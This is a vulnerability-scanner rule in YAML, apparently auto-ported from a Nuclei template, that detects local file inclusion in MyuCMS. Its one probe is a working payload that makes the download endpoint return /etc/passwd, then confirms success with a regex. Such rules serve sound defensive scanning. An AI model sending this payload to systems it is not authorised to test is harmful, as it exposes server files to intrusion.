schema_version: 1
id: "cortex.community:myucms-lfr"
rule_version: "1.0.0"
requires:
  engine_api: 1
  capabilities: ["http.standard.v1", "matchers.basic.v1", "proof.signal.v1"]
info:
  name: "MyuCMS - Local File Inclusion"
  description: "MyuCMS is vulnerable to local file inclusion. Auto-ported from a Nuclei template by nuclei2cdl. Certainty is LIKELY: a ported matcher has no baseline/differential proof, so it is a signal, not a confirmed exploit. Review before use."
  references:
    - "https://blog.csdn.net/yalecaltech/article/details/104908257"
  cwes: [22]
  tags: ["myucms", "lfi", "vuln", "nuclei", "auto-ported", "signal"]
  remediation: "See the referenced advisory / template source for remediation."
finding:
  sink_type: "VULNERABLE_COMPONENT"
  impact: "INFORMATION_DISCLOSURE"
  severity: "High"
  root_cause: "nuclei-ported-signal"
execution: { auth: "anonymous", side_effects: "read_only", transport: "http" }
steps:
  - id: "probe0"
    request: { method: "GET", path: "/index.php/bbs/index/download?url=/etc/passwd&name=1.txt&local=1" }
proof:
  kind: "signal.v1"
  assertions:
    regex: { left: { ref: "steps.probe0.body" }, right: { value: "root:.*:0:0:" } }
